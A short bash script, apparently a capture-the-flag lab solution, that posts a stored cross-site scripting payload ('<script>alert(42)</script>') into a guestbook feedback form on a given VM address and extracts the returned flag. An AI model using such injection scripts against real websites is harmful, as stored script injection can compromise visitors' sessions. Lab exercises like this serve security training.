#!/bin/bash

echo "input the VM ip address :"
read ip

url="http://${ip}/?page=feedback"

response=$(curl -s -X POST -d "txtName=a" -d "mtxtMessage=<script>alert(42)</script>" -d "btnSign=Sign Guestbook" "$url" | grep "flag")
response=$(cut -f3 -d ":" <<< $response | cut -c -65)
echo "FLAG:${response}"